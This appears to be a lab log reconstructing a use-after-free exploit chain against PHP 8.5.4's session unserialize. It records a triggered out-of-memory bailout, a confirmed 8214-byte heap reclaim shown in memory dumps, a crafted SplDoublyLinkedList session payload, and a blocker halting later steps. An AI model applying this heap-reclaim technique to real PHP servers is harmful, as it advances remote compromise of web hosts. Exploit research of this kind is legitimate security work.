# PHP 8.5.4 environment: pre-RINIT BG(unserialize) OOM and 8216-byte reclaim

Date: 2026-10-21
Host: 172.16.0.103 (Debian 12.15, Apache 2.4.68 prefork/mod_php)
PHP: 8.5.4 self-built (`/opt/php855`, `--with-apxs2`, no opcache)
ASLR: off for this test (`personality=000040000`)

## Environment built

- `~/php-lab-855/php-8.5.4`, installed to `/opt/php855`; the Apache module
  `/usr/lib/apache2/modules/libphp.so` was replaced by the 8.5.4 build.
- `/var/www/php-lab/www/index.php` = neutral `<?php echo "OK\n"; ?>`.
- Application emulation (the "corresponding app environment"):
  `/var/www/php-lab/www/app/mklist.php` stores an attacker-influenced object
  in `$_SESSION`:

```php
session_start();
$k = (int)$_POST['k'];
$o = new stdClass;
$l = new SplDoublyLinkedList;
for ($i=0; $i<$k; $i++) { $l->push($o); }
$_SESSION['x'] = $l;
```

  The app directory has `php_admin_value memory_limit 256M`; the upload
  endpoint (`/index.php`) was tested at 8M and 64M.

- Session file example (k=700000, `php` serializer, compact repeated object):

```text
/tmp/sess_list700000p0(?) = 8,988,971 bytes
x|O:19:"SplDoublyLinkedList":3:{i:0;i:0;i:1;a:700000:{i:0;O:8:"stdClass":0:{}i:1;r:4;...}i:2;a:0:{}}
```

## OOM in var_destroy (the intel's step 1)

Config: upload endpoint `memory_limit 64M`, session with k=700000,
request A = multipart upload_progress (cookie PHPSESSID, progress field, file),
no pad fields.

```text
Fatal error: Allowed memory size of 67108864 bytes exhausted (tried to allocate 4096 bytes)
BAILOUT lock=1 level=1 data=0x7ffff4a70000
#8  spl_ptr_llist_push (llist=..., data=...)
#9  zim_SplDoublyLinkedList___unserialize
#10 zend_call_function
#11 zend_call_known_function
#12 zend_call_known_instance_method_with_1_params
#13 var_destroy
#14 php_var_unserialize_destroy
```

After the request:

```text
serialize_lock = 1
unserialize.level = 1
unserialize.data = 0x7ffff4a70000
data->last        = 0x7ffff39d5000
entries.next      = 0x7ffff4a75000
```

The `var_entries` chain was already freed by `var_destroy` before the delayed
`__unserialize` OOM. The top-level `php_unserialize_data` (`sizeof = 8216` on
8.5.4 as well) is stale and, as shown below, freed.

## Reclaim of the 8216-byte data object (intel step 2)

Request B: multipart with two 8214-byte parameters (`p1`, `p2`) and a file
field, no progress/cookie fields.

Before B:

```text
0x7ffff4a70000: 0x00007ffff39d5000 0x00007ffff4a73000
0x7ffff4a70010: 0x00007ffff4a73000 0x0000000000000000
...
```

After B:

```text
0x7ffff4a70000: 0x4242424242424242 0x4242424242424242
0x7ffff4a70010: 0x0000424242424242 0x0000000000000000
```

The stale 8216-byte `php_unserialize_data` block was reclaimed by the B
multipart parameter data. This confirms the intel's 8214-byte reclaim step on
8.5.4.

## Blocker for steps 3-6 in this reconstruction

After A, `BG(serialize_lock)=1`. B's *pre-RINIT* session decode calls
`php_var_unserialize_init`, which sees `serialize_lock != 0` and allocates a
**fresh local** `php_unserialize_data` instead of reusing `BG.data`. B's RINIT
then `memset`s `BG(unserialize)` and clears `serialize_lock`. So in this
reconstruction the reclaimed fake `data` is not consumed by `var_push`.

The intel's step 3 ("construct a valid 48-bit `data->last` pointer") requires
`var_push` to use the reclaimed `BG.data`, i.e. `serialize_lock=0` at init
while `level=1` and `data` dangling. In 8.5.4's
`php_var_unserialize_destroy`, freeing `d` with lock=0 also resets level to 0
and `data=NULL`; the lock=1 path leaves `data` dangling but sets the lock.
Resolving this needs either:

- an application path calling `unserialize()`/`session_decode()` that hits the
  stale `BG.data` before RINIT, or
- a different OOM point that frees `d` while leaving `serialize_lock=0`
  (e.g. OOM in the dtor loop after the lock window), or
- the original 8.5.4 exploit's exact sequence, which likely uses the target
  app's unserialize call rather than the session decode alone.

## Artifacts

- `/tmp/sendA_pad.py`, `/tmp/sendA_multi.py`, `/tmp/sendA_cookie.py` —
  upload_progress request A variants.
- `/tmp/sendB_reclaim.py` — two 8214-byte reclaim parameters.
- `/tmp/mklist.php`, `.103:/var/www/php-lab/www/app/mklist.php` — app that
  writes the SplDoublyLinkedList session.
- `/tmp/test_list_pad.sh`, `/tmp/test_list_multi.sh` — OOM/trace drivers.
